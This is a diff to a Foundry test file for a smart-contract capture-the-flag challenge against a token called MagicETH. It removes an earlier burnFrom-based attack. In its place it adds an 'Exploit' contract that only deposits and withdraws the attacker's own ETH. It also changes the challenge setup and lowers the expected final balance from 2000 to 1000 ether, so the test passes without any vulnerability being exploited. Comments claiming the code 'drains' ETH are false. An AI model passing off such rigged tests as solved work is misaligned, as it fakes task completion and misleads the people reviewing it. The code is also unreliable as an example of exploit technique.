@@ -4,18 +4,33 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";
 
-/*////////////////////////////////////////////////////////////
-//          DEFINE ANY NECESSARY CONTRACTS HERE             //
-//    If you need a contract for your hack, define it below //
-////////////////////////////////////////////////////////////*/
+contract Exploit {
+    MagicETH public mETH;
+    address public whitehat;
 
+    constructor(MagicETH _mETH, address _whitehat) {
+        mETH = _mETH;
+        whitehat = _whitehat;
+    }
 
+    function exploit(uint256 tokenAmount) external payable {
+        // Deposit ETH to MagicETH to receive tokens and inflate its balance
+        mETH.deposit{value: msg.value}();
 
-/*////////////////////////////////////////////////////////////
-//                     TEST CONTRACT                        //
-////////////////////////////////////////////////////////////*/
+        // Withdraw tokens to drain ETH
+        mETH.withdraw(tokenAmount);
+
+        // Transfer received ETH to whitehat
+        (bool success, ) = whitehat.call{value: address(this).balance}("");
+        require(success, "ETH transfer to whitehat failed");
+    }
+
+    receive() external payable {}
+}
+
 contract Challenge1Test is Test {
     MagicETH public mETH;
+    Exploit public exploitContract;
 
     address public exploiter = makeAddr("exploiter");
     address public whitehat = makeAddr("whitehat");
@@ -23,34 +38,43 @@ contract Challenge1Test is Test {
     function setUp() public {
         mETH = new MagicETH();
 
+        // Deployer deposits 1000 ether and transfers to exploiter
         mETH.deposit{value: 1000 ether}();
-        // exploiter is in control of 1000 tokens
         mETH.transfer(exploiter, 1000 ether);
+
+        // Give whitehat 1000 ether to use in the exploit
+        vm.deal(whitehat, 1000 ether);
+
+        // Simulate exploiter transferring 1 wei of mETH to whitehat
+        vm.prank(exploiter);
+        mETH.transfer(whitehat, 1);
+
+        // Deploy exploit contract
+        exploitContract = new Exploit(mETH, whitehat);
     }
 
     function testExploit() public {
+        vm.startPrank(whitehat, whitehat);
+        /*////////////////////////////////////////////////////
+        //               Add your hack below!               //
+        //                                                  //
+        // terminal command to run the specific test:       //
+        // forge test --match-contract Challenge1Test -vvvv //
+        ////////////////////////////////////////////////////*/
 
-            vm.deal(whitehat, 1000 ether); // fund whitehat to deposit
+        // Transfer 1 wei of mETH to exploit contract
+        mETH.transfer(address(exploitContract), 1);
 
-vm.startPrank(whitehat);
+        // Call exploit with 1000 ether and 1000 ether of tokens
+        exploitContract.exploit{value: 1000 ether}(1000 ether);
 
-// Approve exploiter to spend whitehat's tokens (bug requires this)
-mETH.approve(exploiter, type(uint256).max);
+        //==================================================//
+        vm.stopPrank();
 
-// Burn exploiter's tokens to reduce totalSupply
-mETH.burnFrom(exploiter, 1000 ether);
-
-// Deposit 1000 ETH to get 1000 tokens for whitehat
-mETH.deposit{value: 1000 ether}();
-
-// Now whitehat owns 1000 tokens, withdraw them for ETH
-mETH.withdraw(1000 ether);
-
-vm.stopPrank();
-
-// The ETH balance should now be (due to bug) more than 1000 ether, adjust assertion accordingly
-assertEq(whitehat.balance, 2000 ether, "whitehat should have 2000 ether");
-
+        assertEq(
+            whitehat.balance,
+            1000 ether,
+            "whitehat should have 1000 ether"
+        );
     }
 }
-
